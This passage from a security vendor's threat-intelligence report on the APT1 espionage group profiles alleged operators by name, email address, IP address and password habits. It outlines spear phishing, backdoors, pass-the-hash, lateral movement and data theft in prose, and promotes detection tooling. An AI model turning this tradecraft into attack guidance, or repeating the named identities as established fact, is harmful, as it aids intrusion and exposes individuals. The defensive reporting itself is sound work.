and Raith to communicate via email in fluent English 
with various targets including South East Asian military 
organizations in Malaysia and the Philippines. It is unclear 
if this Gmail account is used exclusively for facilitating his 
CNO mission, but much of the traffic indicates its use in 
both simple phishing attacks, as well as more sophisticated 
email based social engineering.

Dota: a harry “Poter” fan?
The DOTA persona also appears to be a 
fan of the popular “Harry Potter” character, 
frequently setting accounts “security 
questions” such as “Who is your favorite 
teacher?” and “Who is your best childhood 
friend?” to the values “Harry” and “Poter” and 
creating accounts such as poter.spo1@gmail.
com with the alternate email address set to 
dota.sb005@gmail.com.

Mandiant APT1 

56 

www.mandiant.com

Figure 30: dota.d001@gmail.com (inbox view)41

When creating dozens, or hundreds, of accounts in online communities and on victim systems, password management 
becomes a significant undertaking. Consequently, most APT1 attackers use passwords that are either pattern-based, 
such as the keyboard pattern “1qaz2wsx” or highly memorable, using “rootkit” as a password on the information 
security research site rootkit.com. Like many APT1 attackers, DOTA frequently uses keyboard based patterns as 
passwords such as “1qaz@WSX#EDC”. However, there is one password “2j3c1k” extensively used by DOTA that is not 
based on a keyboard pattern, though he may not be the only APT1 actor that uses it. A numbered “j”, followed by a 
numbered “c”, and then a numbered “k” is likely shorthand (“j”/”c”/”k”) for the ju/chu/ke (局／处／科) organizational 
structure (translated to Bureau/Division (or Office)/Section) widely used within PLA General Staff Department 
organizations. Project 2049 describes the typical PLA organizational structure as, “Bureau-level directors … oversee 
between six and 14 subordinate sites or offices [chu; 处]… Sites/offices under bureaus are further divided into sections 

41  This is a screen capture of DOTA accessing his Gmail account while using a compromised system on APT1’s attack infrastructure.

Mandiant APT1

[ke; 科].42 Given this pattern, it is likely that the password “2j3c1k” stands for 2nd Bureau [Unit 61398], 3rd Division, 
1st Section, demonstrating that those who use these patterns are working together and affiliate themselves to the 2nd 
Bureau.

Attempting to track the DOTA persona back to a particular individual is difficult; the trail of his activity does not link 
as clearly to a real world identity. However, Mandiant has been able to establish a clear link between UG and DOTA. 
Specifically, we have observed the two using shared APT1 infrastructure, FQDNs, and egress IP address ranges. The 
coordination of this shared infrastructure, combined with their close proximity and association with Unit 61398 makes 
it highly likely that, at the very least, UG and DOTA know each other personally and likely even work together.

APT1 Hacker Profile: SuperHard (Mei Qiang/梅强)

The third and final persona we are revealing has been dubbed “SuperHard” (SH). SH was first observed as a tool 
author, and is either the creator or a significant contributor to the AURIGA and BANGAT malware families (covered 
in Appendix C: The Malware Arsenal). Similarly to UG, SH signs much of his work by embedding strings within the 
tools. In particular, elements of the portable executable (PE) file’s VS_VERSIONINFO structure are frequently set to 
“SuperHard,” or cmd.exe copies are modified from “Microsoft corp.” to “superhard corp.”

Additionally, many of SH’s tools contain driver modules designed to be loaded into the Windows kernel in order to 
subvert elements of the system. While not unique for APT1 coders, this level of development expertise is certainly 
a discriminator that puts SH into a smaller group of highly capable developers within APT1. Often, SH’s tools are 
observed in use by other APT1 personae and in several instances, other APT groups we track. Given that SH’s tools 
are used by other APT1 actors, and that there are no indications that SH is a full-time operator, we believe that SH is 
primarily involved in research and development for APT1.

Once again, in tracking SH we are fortunate to have access to the accounts disclosed from rootkit.com. The rootkit.
com account “SuperHard_M” was originally registered from the IP address 58.247.237.4, within one of the known 
APT1 egress ranges, and using the email address “mei_qiang_82@sohu.com”. We have observed the DOTA persona 
emailing someone with the username mei_qiang_82. The name “Mei Qiang” (梅强) is a reasonably common Chinese 
last/first name combination. Additionally, it is a common practice for Chinese netizens to append the last two digits of 
their birth year, suggesting that SuperHard is in fact Mei Qiang and was born in 1982. Unfortunately, there are several 
“Mei Qiang” identities online that claim a birth year of 1982, making attribution to an individual difficult.

Fortunately, we can use SH’s email address to connect him to a number of Websites and forums on which he 
registered and contributed using that address. Many of these accounts reveal details that reinforce SH’s link to the 
“mei_qiang_82@sohu.com”43 email address and APT1 affiliation, such as SH offering to write Trojans for money, his 
involvement with malicious Windows kernel research (incidentally, also commented on by “greenfield”, possibly UG), 
and more recently, being local to Shanghai’s Pudong New Area.44

ConCLusIon

In a State that rigorously monitors Internet use, it is highly unlikely that the Chinese Government is unaware of an 
attack group that operates from the Pudong New Area of Shanghai. The detection and awareness of APT1 is made 
even more probable by the sheer scale and sustainment of attacks that we have observed and documented in this 
report. Therefore the most probable conclusion is that APT1 is able to wage such a long-running and extensive cyber 
espionage campaign because it is acting with the full knowledge and cooperation of the government. Given the 
mission, resourcing, and location of PLA Unit 61398, we conclude that PLA Unit 61398 is APT1. Table 12 summarizes 
the parallels between APT1 and PLA Unit 61398.

how Does ManDIant   

DIstInGuIsh threat GrouPs?

Mandiant uses the term threat group to refer to a collection of intruders who are working together to target and 
penetrate networks of interest. These individuals may share the same set of tasks, coordinate their targets, and 
share tools and methodology. They work together to gain access to their targets and steal data. Therefore, a group is 
ultimately defined by people and not by methodology.

However, defining a threat group based on observed intrusion activity is not so simple. Without seeing who is sitting 
behind the keyboard it may be difficult to determine whether two different intrusion events were conducted by the 
same person, by two people who are working together, by two unrelated people who independently compromised the 
same network, or even the same computer. Different groups may use similar intrusion methodology and common tools, 
particularly those that are widely available on the Internet, such as pwdump, HTRAN, or Gh0st RAT. Furthermore, there 
may be overlaps between groups caused by the sharing of malware or exploits they have authored, or even the sharing 
of personnel. Individual intruders may move between groups either temporarily or permanently. An intruder may be a 
private citizen who is hired by multiple groups. Finally, multiple groups may work together on occasion to compromise 
the same target.

Nevertheless, distinguishing one threat group from another is possible with enough information, analytical experience, 
and the technological tools to piece it all together. Consider an analogy with the physical world: imagine a thief who 
leaves behind traces of his crime at various crime scenes. Individual robberies may vary in many details:

»»

»»

The method the thief used to break in;

The tools used to open the safe;

»» Whether the thief carefully selected a particular item to steal, or took everything in the hope that he managed to 

grab something of value;

»» Whether the thief carefully researched their target, disabled alarms, and attempted to remove evidence such as 
fingerprints; or whether he was not very careful, but simply relied on being “stealthy enough” to not get caught.

Mandiant APT1 

61 

www.mandiant.com

Forensic scientists can analyze multiple crime scenes and be able to tell by the evidence left behind that a given crime 
scene was the result of one thief and not another. 

In a similar way, cyber intruders leave behind various digital “fingerprints.” They may send spear-phishing emails from 
a specific IP address or email address. Their emails may contain certain patterns of subject lines. Their files have 
specific names, MD5 hashes, timestamps, custom functions, and encryption algorithms. Their backdoors may have 
command and control IP addresses or domain names embedded. These are just a few examples of the myriad of 
linkages that computer forensic analysts consider when trying to distinguish one cyber threat group from another.

Digital “fingerprints” do not all carry equal weight in attribution analysis. Their validity or value as indicators of a specific 
threat group depends largely on their likelihood of uniqueness. For example, the use of a widely available tool such as 
HTRAN is not unique and not useful — by itself — as an indicator of a specific threat group. In contrast, the use of 
a specific, custom backdoor not observed elsewhere is a much stronger indicator — although it is generally still not 
sufficient, on its own, for positive attribution.

At the most basic level, we say that two intrusion events are attributed to the same group when we have collected 
enough indicators to show beyond a reasonable doubt that the same person or group of people were involved.

aPPenDIx B:   

aPt anD the a ttaCk LIFeCyCLe

While most computer intrusions follow a generic, high-level series of steps in the attack lifecycle, the Chinese APT 
lifecycle differs slightly because of their unique long-term objectives. The sections below correspond to the stages 
of Mandiant’s Attack Lifecycle model and give an overview of what APT activity looks like in each stage. The stages 
between “Establish Foothold” and “Complete Mission” do not have to occur in this order every time. In fact, once 
established within a network, APT groups will continually repeat the cycle of conducting reconnaissance, identifying 
data of interest, moving laterally to access that data, and “completing mission” by stealing the data. This will generally 
continue indefinitely until they are removed entirely from the network. 

Initial Compromise

The Initial Compromise stage represents the methods that intruders use to penetrate a target organization’s network. 
APT intruders frequently target individual users within a victim environment. As such, the most commonly observed 
method of initial compromise is spear phishing. Spear phishing messages may contain malicious attachments, a link to 
a malicious file, or a link to a malicious website. Less commonly, APT intruders may attempt to contact potential victims 
and send malicious content via social networking sites or instant messaging. Another common tactic is strategic web 
compromise, in which the attacker places malicious code on websites that people in targeted organizations will likely 
visit. When they visit these websites in the course of their normal duties, they will be compromised if their computer 
is vulnerable to the attacker’s exploit code. APT groups may also look for vulnerable Internet-facing web servers and 
upload webshells in order to gain access to a targets internal network, or look for other technical vulnerabilities in 
public-facing infrastructure.

Establish Foothold

Establishing a foothold ensures that APT threat groups can access and control one or more computers within the 
victim organization from outside the network. APT groups can utilize public backdoors (Gh0st RAT and Poison Ivy are 
common examples), “underground” backdoors found in hacker websites or obtained through personal connections, 
and “custom” backdoors that they developed themselves. These backdoors usually establish an outbound connection 
from the victim network to a computer controlled by the attackers. The communication methods used by the backdoors 
vary from clear text or simple encoding to the use of more advanced encoding or encryption. The backdoors will give 
the APT groups basic access to a system, typically through a command shell or graphical user interface.

Mandiant APT1 

63 

www.mandiant.com

Escalate Privileges

Escalating privileges involves acquiring items that will allow access to more resources within the victim environment. 
Most often this consists of obtaining usernames and passwords, but it may also include gaining access to PKI 
certificates, VPN client software, privileged computers, or other resources required to access data or systems of 
interest. APT intruders (and intruders in general) prefer to leverage privileged accounts where possible, such as 
Domain Administrators, service accounts with Domain privileges, local Administrator accounts, and privileged user 
accounts. This is typically accomplished by first “dumping” password hashes from a computer, server, or (preferably) 
Domain Controller. The attacker may be able to obtain legitimate account passwords by “cracking” password hashes. 
Alternately, the attacker may leverage the hashes themselves in a “pass-the-hash” attack, where the hashed password 
itself may be used for authentication in lieu of the actual password. A number of publicly available tools can be readily 
leveraged for both password dumping and pass-the-hash attacks.

Internal Reconnaissance

In the Internal Reconnaissance stage, the intruder collects information about the victim environment. APT threat 
actors use built-in operating system commands (such as the Windows “net” commands) to obtain information about 
the internal network, including computers, trust relationships, users, and groups. In order to identify data of interest, 
they may perform directory or network share listings, or search for data by file extension, key word, or last modified 
date. Data of interest may take many forms, but most commonly consists of documents, the contents of user email 
accounts, or databases. Therefore file servers, email servers, and domain controllers are customary targets of internal 
reconnaissance. Some APT groups utilize custom scripts in order to automate the process of reconnaissance and 
identification of data of interest. 

Move Laterally

In most cases, the systems that the intruders initially compromise do not contain the data that they want. Therefore 
they must move laterally within a network to other computers that either contain that data or allow them to access it. 
APT groups leverage compromised user credentials or pass-the-hash tools to gain access to additional computers and 
devices inside of a victim network. They commonly use compromised credentials with PsExec and / or the Windows 
Task Scheduler (“at” command) to execute commands and install malware on remote systems.

Maintain Presence

In this stage, the intruders take actions to ensure continued control over key systems in the network environment from 
outside of the network. APT groups often install new backdoors (e.g., different backdoors than the ones installed in the 
Establish Foothold phase) in the environment during the course of the campaign. They may install different families of 
malware on multiple computers and use a variety of command and control addresses, presumably for redundancy and 
to make it difficult to identify and remove all of their access points. Additionally, APT groups may establish methods of 
network access that do not involve backdoors, so that they can maintain a presence even if network security personnel 
discover and remove their malware. These methods may include the use of valid PKI or VPN credentials, allowing the 
intruders to masquerade as a legitimate user to gain access to a corporate network and internal resources. In some 
instances APT threat actors have been able to circumvent two-factor authentication to maintain access to a victim 
network and its resources.

Complete Mission

The main goal of APT intrusions is to steal data, including intellectual property, business contracts or negotiations, 
policy papers or internal memoranda. Once APT groups find files of interest on compromised systems, they often pack 
them into archive files before stealing them. They most commonly use the RAR archiving utility for this task, but may 
also use other publicly available utilities such as ZIP or 7-ZIP. APT threat actors not only compress data, but frequently 
password-protect the archive. From there they use a variety of methods to transfer files out of the victim network, 
including FTP, custom file transfer tools, or existing backdoors.

APT1 Indicators and Using Redline™ 

With the release of Mandiant’s report, APT1: Exposing One of China’s Cyber Espionage Units, we are providing a set of 
APT1 IOCs in the digital portion of Appendix G to help detect malware described in Appendix C: The Malware Arsenal. 
IOCs can be used in investigations to find unknown evils or for detection of already known threats. The IOCs included 
in Appendix G fit the latter; however, keep in mind that APT1 does update their tools, and there are certainly malware 
variants and new families of malware that will not be detected with this set of IOCs. To find out more about the report or 
the digital appendices (to include downloading the set of APT1 IOCs in Appendix G: IOCs) go to http://www.mandiant.
com/apt1. 

IOCs can be used in conjunction with Redline, Mandiant’s free host-based investigative tool, or with Mandiant 
Intelligent Response® (MIR), Mandiant’s commercial host-based investigative tool. Mandiant’s customers who have 
licensed MIR can simply import a zip file of the IOCs into their controllers. For those without MIR, Redline can be 
downloaded from Mandiant’s web site at http://www.mandiant.com/resources/download/redline.

Remember to always test new IOCs before using them in a production environment.

What Are IOCs?

Mandiant has developed an open, extendable standard for defining and sharing threat information in a machine-
readable format. Going well beyond static signature analysis, IOCs combine over 500 types of forensic evidence with 
grouping and logical operators to provide advanced threat detection capability. 

If you are not familiar with IOCs, go to the OpenIOC site for a description at http://openioc.org.

What Is Redline?

Redline is Mandiant’s free tool for investigating hosts for signs of malicious activity through memory and file analysis, 
and subsequently developing a threat assessment profile. Redline provides several benefits including the following:

RAPID TRIAGE
When confronted with a potentially compromised host, responders must first assess whether the system has active 
malware. Without installing software or disrupting the current state of the host, Redline thoroughly audits all currently-
running processes and drivers on the system for a quick analysis; for a detailed analysis, it also collects the entire 
file structure, network state, and system memory. Redline will also compare any MD5 value it collects, analyzes, and 
visualizes against an MD5 whitelist. Users can further analyze and view imported audit data using Redline’s Timeline 
functionality, which includes capabilities to narrow and filter results around a given timeframe with the TimeWrinkles™ 
and TimeCrunches™ features. 

REVEALS HIDDEN MALWARE
The Redline Portable Agent can collect and analyze a complete memory image, working below the level at which 
kernel rootkits and other malware-hiding techniques operate. Many hiding techniques become extremely obvious when 
examined at the physical memory level, making memory analysis a powerful tool for finding malware. It also reveals 
“memory only” malware that is not present on disk.

GUIDED ANALYSIS
Mandiant’s Redline tool streamlines memory analysis by providing a proven workflow for analyzing malware based on 
relative priority. This takes the guesswork out of task and time allocation, allowing investigators to provide a focused 
response to the threats that matter most. 

Redline calculates a “Malware Risk Index” that highlights processes more likely to be worth investigating, and 
encourages users to follow investigative steps that suggest how to start. As users review more audits from clean and 
compromised systems, they build up the experience to recognize malicious activity more quickly.

As you investigate a system, here’s how Redline will help you focus your attention on the most productive data:

INVESTIGATIVE STEPS
Redline can collect a daunting amount of raw information. Its investigative steps help provide a starting place by 
highlighting specific data and providing views that are most commonly productive in identifying malicious processes. 
Unless you are pursuing a specific “lead”, we recommend working through the steps in order, examining the 
information for entries that don’t match your expectations.

The key to becoming an effective investigator is to review Redline data from a variety of “clean” and “compromised” 
systems. Over time, your sense of which entries are normal and which are of concern will develop quickly as you view 
more data.

MALWARE RISK INDEx SCORING
Redline analyzes each process and memory section using a variety of rules and techniques to calculate a “Malware 
Risk Index” for each process. This score is a helpful guide to identifying those processes that are more likely to be 
worth investigating. Processes at the highest risk of being compromised by malware are highlighted with a red badge. 
Those with some risk factors have a grey badge, and low-risk processes have no badge.

The MRI is not an absolute indication of malware. During an investigation you can refine the MRI scoring by adjusting 
specific hits (identifying false positives and false negatives) for each process, adding your own hits, and generally 
tuning the results.

IOCs
Redline provides the option of performing IOC analysis in addition to MRI scoring. Supplied a set of IOCs, the Redline 
Portable Agent will be automatically configured to gather the data required to perform a subsequent IOC analysis; after 
the analysis is run, IOC hit results are available for further investigation.

In addition, Redline provides the ability to create an IOC Collector. This feature enables the collection of data types 
required for matching a set of IOCs. 

WORKS WITH MIR
Combined with MIR, Redline is a powerful tool for accelerated live response. Here’s a typical case:
»»

IDS or other system detects suspicious activity on a host

»»

»»

»»

From MIR, an investigator launches a remote live response script

The MIR Agent running on the host captures and analyzes memory locally, streaming back a small XML audit that 
downloads in minutes rather than hours

From MIR, the user can open the audit directly in Redline

»» Using Redline, the investigator quickly identifies a malicious process, and writes an IOC describing the forensic 

attributes found in Redline

»» Using MIR and MCIC, the investigator is quickly able to sweep for that IOC and discover all other systems on the 

network with the same (or similar) malware running

Have MIR Customers had Access to these IOCs Before?

These IOCs are new! However, much of the detection capability in this set of indicators has already been available to 
our MIR customers. The IOCs may look different though as a result of improvements in creation and testing. Mandiant 
started 2013 with a focus on taking better advantage of our threat intelligence. We plan to continue to improve the 
synthesis of our threat intelligence and our IOCs by improving our breadth, IOC creation process, IOC management 
process, and IOC testing. The majority of these indicators, or modified versions of them, will be integrated into the next 
IOC release.

What Is the FAMILY Designator in This Set of IOCs?

We are using a new IOC designator in these IOCs called “(FAMILY).” Mandiant’s Threat Intelligence Unit tracks 
malware by common features seen in groups of binaries. We call those groupings of binaries “families.” The IOCs 
included in this appendix are representatives of families of malware used by APT1. The new designator follows the 
family name in the “Name” field of the IOC, and the presence of (FAMILY) implies that that IOC applies to the whole 
family, not just one sample.

Why Do These IOCs Look Somewhat Different Than Other IOCs I Have Seen From 
Mandiant?

In many cases we have combined information that previously would have been in several indicators into a single 
indicator. Additionally, we have removed certain types of intelligence, since they are being released in separate 
appendices (such as FQDNs and IPs).

Additionally, some IOCs in this set are using file permutation blocks to catch variants of malware that might not be 
detected otherwise.

What Is a File Permutation block? 

It is a different way to structure lists of File Item attributes to look for an entire family of malware versus only one or two 
pieces. For more information on this topic or most any other IOC questions go to https://forums.mandiant.com.

Will You Update These IOCs?

It is likely that we will make some changes to the IOCs in Appendix G as we get feedback. If updated, the updates will 
be available in the same location as the report http://www.mandiant.com/apt1.

Will You Be Releasing More IOCs Like This?

Currently, there are no plans for additional public releases of this magnitude.
